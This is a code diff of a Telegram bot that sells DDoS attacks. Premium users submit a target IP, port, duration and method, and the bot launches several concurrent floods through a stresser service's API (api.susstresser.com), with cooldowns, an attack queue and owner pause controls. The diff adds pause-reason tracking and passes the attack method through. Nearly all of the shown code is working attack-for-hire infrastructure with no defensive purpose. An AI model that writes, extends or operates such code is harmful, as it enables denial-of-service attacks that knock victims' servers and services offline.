@@ -1,4 +1,4 @@
-# app.py - COMPLETE ULTIMATE VERSION WITH ALL FEATURES
+# app.py - COMPLETE ULTIMATE VERSION WITH ALL FIXES
 import os
 import logging
 import asyncio
@@ -154,33 +154,26 @@ class Database:
         plan = user.get("plan", "free")
         expiry = user.get("plan_expiry")
         
-        logger.info(f"DEBUG: User {user_id} - Raw data: plan={plan}, expiry={expiry}")
-        
         if plan == "free":
             return "free", None
         
         if plan == "premium":
             if expiry is None:
-                logger.info(f"DEBUG: User {user_id} has LIFETIME premium")
                 return "premium", None
             
             if isinstance(expiry, str):
                 try:
                     expiry = datetime.fromisoformat(expiry)
-                    logger.info(f"DEBUG: User {user_id} parsed expiry: {expiry}")
                 except Exception as e:
-                    logger.error(f"DEBUG: Error parsing expiry for {user_id}: {e}")
+                    logger.error(f"Error parsing expiry for {user_id}: {e}")
                     return "premium", None
             
             if expiry and isinstance(expiry, datetime):
                 if expiry < datetime.now():
-                    logger.info(f"DEBUG: User {user_id} plan expired at {expiry}")
                     return "premium", expiry
                 else:
-                    logger.info(f"DEBUG: User {user_id} has valid premium until {expiry}")
                     return "premium", expiry
             else:
-                logger.info(f"DEBUG: User {user_id} has premium with no valid expiry - treating as premium")
                 return "premium", None
         
         return plan, expiry
@@ -528,6 +521,23 @@ class Database:
                 return settings.get("pause_all", False)
         return self.settings.get("pause_all", False)
     
+    def get_pause_info(self):
+        if not self.memory_mode:
+            settings = self.settings.find_one({"_id": "bot_settings"})
+            if settings:
+                return {
+                    "paused": settings.get("pause_all", False),
+                    "paused_by": settings.get("paused_by"),
+                    "paused_at": settings.get("paused_at"),
+                    "pause_reason": settings.get("pause_reason")
+                }
+        return {
+            "paused": self.settings.get("pause_all", False),
+            "paused_by": None,
+            "paused_at": None,
+            "pause_reason": None
+        }
+    
     def set_pause(self, paused, paused_by=None, reason=None):
         if not self.memory_mode:
             self.settings.update_one(
@@ -628,7 +638,6 @@ class AttackManager:
         self.attack_queue = []
         self.processing_queue = False
         
-        # Global cooldown settings
         self.global_cooldown_active = False
         self.global_cooldown_end = None
         self.last_attack_user = None
@@ -645,13 +654,11 @@ class AttackManager:
     
     def can_start_attack(self, user_id):
         with self.lock:
-            # Check global cooldown
             if self.global_cooldown_active and self.global_cooldown_end:
                 if datetime.now() < self.global_cooldown_end:
                     remaining = int((self.global_cooldown_end - datetime.now()).total_seconds())
                     return False, f"🌍 *Global Cooldown Active*\n\nWait {remaining}s before next attack.\nLast attack by: {self.last_attack_user}"
             
-            # Check if attack already running
             if self.global_attack_running:
                 remaining = 0
                 if self.attack_end_time:
@@ -660,7 +667,6 @@ class AttackManager:
                         remaining = 0
                 return False, f"❌ Attack already running!\nUser: {self.current_attacker}\n⏳ Time remaining: {remaining}s"
             
-            # Check user cooldown
             last_attack_time = db.get_last_attack_time(user_id)
             last_duration = db.get_last_attack_duration(user_id)
             
@@ -678,7 +684,6 @@ class AttackManager:
                         remaining = int(cooldown_time - elapsed)
                         return False, f"⏳ User Cooldown: {remaining}s remaining\n(Attack: {last_duration}s → Cooldown: {cooldown_time}s)"
             
-            # Check user concurrent attacks
             user_attacks = sum(1 for a in self.active_attacks.values() if a['user_id'] == user_id)
             if user_attacks >= MAX_CONCURRENT:
                 return False, f"❌ Already running {user_attacks}/{MAX_CONCURRENT} concurrent attacks"
@@ -700,7 +705,6 @@ class AttackManager:
             self.current_attack_duration = duration
             self.attack_end_time = datetime.now() + timedelta(seconds=duration + 5)
             
-            # Set global cooldown
             self.global_cooldown_active = True
             cooldown = self.get_cooldown_time(duration)
             self.global_cooldown_end = datetime.now() + timedelta(seconds=cooldown)
@@ -789,7 +793,6 @@ class AttackManager:
             attack_data = self.attack_queue.pop(0)
             user_id = attack_data['user_id']
             
-            # Check if user can start
             can_start, msg = self.can_start_attack(user_id)
             if not can_start:
                 try:
@@ -802,7 +805,6 @@ class AttackManager:
                     pass
                 continue
             
-            # Start the attack
             try:
                 attack_id = self.start_attack(
                     user_id, 
@@ -818,7 +820,8 @@ class AttackManager:
                     attack_data['port'], 
                     attack_data['duration'], 
                     user_id, 
-                    attack_data['context']
+                    attack_data['context'],
+                    attack_data['method']
                 )
                 
                 if result:
@@ -908,7 +911,6 @@ async def send_attack_alert(attack_info):
 
 # ===== API ATTACK =====
 async def send_api_attack(target, port, duration, attack_num, api_key, api_url, method):
-    """Send single API attack request with method selection"""
     params = {
         "key": api_key,
         "host": target,
@@ -963,7 +965,6 @@ async def send_api_attack(target, port, duration, attack_num, api_key, api_url, 
 
 # ===== CONCURRENT ATTACKS =====
 async def send_concurrent_attacks(target, port, duration, user_id, context, method="UDP"):
-    """Send multiple concurrent attacks with selected method"""
     logger.info(f"🚀 Launching {MAX_CONCURRENT} concurrent {method} attacks on {target}:{port}")
     
     api_key = os.getenv("API_KEY")
@@ -989,23 +990,19 @@ async def send_concurrent_attacks(target, port, duration, user_id, context, meth
         parse_mode='Markdown'
     )
     
-    # Create all tasks
     tasks = []
     for i in range(1, MAX_CONCURRENT + 1):
         task = send_api_attack(target, port, duration, i, api_key, api_url, method)
         tasks.append(task)
     
-    # Start timer update task
     timer_task = asyncio.create_task(update_timer(status_msg, duration, target, port, method))
     
-    # Run all tasks concurrently
     start_time = time.time()
     results = await asyncio.gather(*tasks, return_exceptions=True)
     elapsed = time.time() - start_time
     
     timer_task.cancel()
     
-    # Process results
     success_count = 0
     failed_count = 0
     result_details = []
@@ -1023,7 +1020,6 @@ async def send_concurrent_attacks(target, port, duration, user_id, context, meth
                 error = r.get('error', r.get('response', 'Unknown error'))
                 result_details.append(f"❌ Attack {r.get('attack_num', '?')} ({r.get('method', 'UDP')}) - {error[:30]}")
     
-    # Create final message
     cooldown = attack_manager.get_cooldown_time(duration)
     
     final_text = (
@@ -1058,7 +1054,6 @@ async def send_concurrent_attacks(target, port, duration, user_id, context, meth
     }
 
 async def update_timer(status_msg, duration, target, port, method="UDP"):
-    """Update the attack timer in the message"""
     try:
         start_time = time.time()
         last_update = 0
@@ -1096,7 +1091,6 @@ async def update_timer(status_msg, duration, target, port, method="UDP"):
 
 # ===== CHECK API STATUS =====
 async def check_api_status():
-    """Check if the API is working"""
     try:
         api_url = os.getenv("API_URL", "https://api.susstresser.com/panel/api/api.php")
         api_key = os.getenv("API_KEY")
@@ -1339,17 +1333,19 @@ async def broadcast_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # ===== OWNER PAUSE FUNCTIONS =====
 async def toggle_pause(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Toggle pause for all members"""
+    """Toggle pause for all members - FIXED for Owner and Pseudo Owner"""
     user_id = update.effective_user.id
     
+    # Check if user is owner OR pseudo_owner (both have equal power)
     if not db.is_owner_or_pseudo(user_id):
-        await update.message.reply_text("❌ Only Owner and Pseudo_Owner can pause the bot!")
+        await update.message.reply_text("❌ Only Owner and Pseudo_Owner can pause/unpause the bot!")
         return
     
-    current_pause = db.get_pause_status()
+    current_pause_info = db.get_pause_info()
+    current_pause = current_pause_info.get('paused', False)
     
     if current_pause:
-        # Unpause
+        # UNPAUSE - Both Owner and Pseudo Owner can unpause
         db.set_pause(False, user_id)
         await update.message.reply_text(
             "✅ *Bot Unpaused*\n\n"
@@ -1369,7 +1365,7 @@ async def toggle_pause(update: Update, context: ContextTypes.DEFAULT_TYPE):
             except:
                 pass
     else:
-        # Pause
+        # PAUSE
         reason = " ".join(context.args) if context.args else "No reason provided"
         db.set_pause(True, user_id, reason)
         await update.message.reply_text(
@@ -1409,11 +1405,16 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     logger.info(f"User {user_id} - Plan: {plan}, Expiry: {expiry}, Is Admin: {is_admin}, Is Owner: {is_owner}")
     
     # Check pause status
-    if db.get_pause_status():
+    pause_info = db.get_pause_info()
+    if pause_info.get('paused', False):
+        paused_by = pause_info.get('paused_by', 'Unknown')
+        reason = pause_info.get('pause_reason', 'No reason provided')
         await update.message.reply_text(
-            "⏸️ *Bot is Paused*\n\n"
-            "The bot is currently paused by the owner.\n"
-            "Please wait until it's unpaused.",
+            f"⏸️ *Bot is Paused*\n\n"
+            f"The bot is currently paused by the owner.\n"
+            f"Reason: {reason}\n"
+            f"Paused by: `{paused_by}`\n\n"
+            f"Please wait until it's unpaused.",
             parse_mode='Markdown'
         )
         return
@@ -1452,7 +1453,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 remaining = int(cooldown - elapsed)
                 cooldown_status = f"\n⏳ *Cooldown:* {remaining}s remaining\n(Attack: {last_duration}s → Cooldown: {cooldown}s)"
     
-    # Global cooldown status
     global_cooldown_status = ""
     if stats['global_cooldown_remaining'] > 0:
         global_cooldown_status = f"\n🌍 *Global Cooldown:* {stats['global_cooldown_remaining']}s remaining"
@@ -1493,7 +1493,8 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     
     # Check pause status
-    if db.get_pause_status():
+    pause_info = db.get_pause_info()
+    if pause_info.get('paused', False):
         await update.message.reply_text(
             "⏸️ *Bot is Paused*\n\n"
             "The bot is currently paused by the owner.",
@@ -1544,7 +1545,6 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         port = int(args[1])
         duration = int(args[2])
         
-        # Get method (default UDP)
         method = args[3].upper() if len(args) > 3 else "UDP"
         if method not in ATTACK_METHODS:
             method = "UDP"
@@ -1558,7 +1558,6 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         can_start, msg = attack_manager.can_start_attack(user_id)
         if not can_start:
-            # If global cooldown is active, add to queue
             if "Global Cooldown" in msg:
                 attack_manager.add_to_queue(user_id, target, port, duration, method, context)
                 await update.message.reply_text(
@@ -1599,7 +1598,8 @@ async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     user_id = query.from_user.id
     
-    if db.get_pause_status():
+    pause_info = db.get_pause_info()
+    if pause_info.get('paused', False):
         await query.edit_message_text(
             "⏸️ *Bot is Paused*\n\n"
             "The bot is currently paused by the owner.",
@@ -1635,7 +1635,6 @@ async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text(msg, parse_mode='Markdown')
         return
     
-    # Show method selection
     keyboard = []
     for method in ATTACK_METHODS:
         keyboard.append([InlineKeyboardButton(f"📡 {method}", callback_data=f"method_{method}")])
@@ -1681,7 +1680,8 @@ async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     user_id = update.effective_user.id
     
-    if db.get_pause_status():
+    pause_info = db.get_pause_info()
+    if pause_info.get('paused', False):
         await update.message.reply_text("⏸️ Bot is paused!")
         context.user_data['awaiting_attack'] = False
         return
@@ -1851,6 +1851,9 @@ async def stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     attack_status = "🟢 IDLE" if not stats['is_running'] else f"🟡 RUNNING (User: {stats['current_user']})"
     
+    pause_info = db.get_pause_info()
+    pause_status = "⏸️ PAUSED" if pause_info.get('paused') else "🟢 ACTIVE"
+    
     stats_text = (
         f"📊 *BOT STATISTICS*\n\n"
         f"👥 Total Users: {len(users)}\n"
@@ -1867,7 +1870,7 @@ async def stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"⚡ {MAX_CONCURRENT}x UDP: ENABLED\n"
         f"⏳ Cooldown: {MIN_COOLDOWN}-{MAX_COOLDOWN}s\n"
         f"📡 Methods: {len(ATTACK_METHODS)}\n"
-        f"🌐 Status: {'🟢 ONLINE' if not db.get_pause_status() else '⏸️ PAUSED'}"
+        f"🌐 Status: {pause_status}"
     )
     
     await query.edit_message_text(
@@ -2206,7 +2209,8 @@ async def owner_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.answer("Access denied! Only Owner and Pseudo_Owner can access this.", show_alert=True)
         return
     
-    pause_status = db.get_pause_status()
+    pause_info = db.get_pause_info()
+    pause_status = pause_info.get('paused', False)
     pause_text = "⏸️ PAUSE BOT" if not pause_status else "▶️ UNPAUSE BOT"
     
     keyboard = [
@@ -2225,13 +2229,19 @@ async def owner_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [InlineKeyboardButton("🔙 BACK", callback_data="back")]
     ]
     
+    pause_info_text = f"Status: {'⏸️ PAUSED' if pause_status else '🟢 ACTIVE'}"
+    if pause_status and pause_info.get('pause_reason'):
+        pause_info_text += f"\nReason: {pause_info.get('pause_reason')}"
+    if pause_status and pause_info.get('paused_by'):
+        pause_info_text += f"\nBy: `{pause_info.get('paused_by')}`"
+    
     await query.edit_message_text(
-        f"👑 OWNER PANEL\n\nBot Status: {'⏸️ PAUSED' if pause_status else '🟢 ACTIVE'}\nSelect action:",
+        f"👑 OWNER PANEL\n\n{pause_info_text}\nSelect action:",
         reply_markup=InlineKeyboardMarkup(keyboard)
     )
 
 async def owner_pause_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Owner pause/unpause callback"""
+    """Owner pause/unpause callback - FIXED for both Owner and Pseudo Owner"""
     query = update.callback_query
     await query.answer()
     
@@ -2240,10 +2250,11 @@ async def owner_pause_callback(update: Update, context: ContextTypes.DEFAULT_TYP
         await query.answer("Access denied!", show_alert=True)
         return
     
-    current_pause = db.get_pause_status()
+    current_pause_info = db.get_pause_info()
+    current_pause = current_pause_info.get('paused', False)
     
     if current_pause:
-        # Unpause
+        # UNPAUSE - Both Owner and Pseudo Owner can unpause
         db.set_pause(False, user_id)
         await query.edit_message_text(
             "✅ *Bot Unpaused*\n\n"
@@ -2264,7 +2275,7 @@ async def owner_pause_callback(update: Update, context: ContextTypes.DEFAULT_TYP
             except:
                 pass
     else:
-        # Pause
+        # PAUSE - Show reason input
         await query.edit_message_text(
             "⏸️ *PAUSE BOT*\n\n"
             "Send a reason for pausing the bot:\n"
@@ -2273,6 +2284,8 @@ async def owner_pause_callback(update: Update, context: ContextTypes.DEFAULT_TYP
             parse_mode='Markdown'
         )
         context.user_data['awaiting_pause_reason'] = True
+        # Store the query to edit later
+        context.user_data['pause_query'] = query
 
 async def process_pause_reason(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not context.user_data.get('awaiting_pause_reason'):
@@ -2840,6 +2853,9 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     attack_status = "🟢 IDLE" if not stats['is_running'] else f"🟡 RUNNING (User: {stats['current_user']})"
     
+    pause_info = db.get_pause_info()
+    pause_status = "⏸️ PAUSED" if pause_info.get('paused') else "🟢 ACTIVE"
+    
     await update.message.reply_text(
         f"📊 *BOT STATUS*\n\n"
         f"⚡ Active: {stats['active']}\n"
@@ -2856,7 +2872,7 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"⏳ Cooldown: {MIN_COOLDOWN}-{MAX_COOLDOWN}s\n"
         f"📡 Methods: {', '.join(ATTACK_METHODS)}\n"
         f"🔑 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n"
-        f"🌐 Status: {'🟢 ONLINE' if not db.get_pause_status() else '⏸️ PAUSED'}\n\n"
+        f"🌐 Status: {pause_status}\n\n"
         f"📌 /attack IP PORT TIME [METHOD]",
         parse_mode='Markdown'
     )
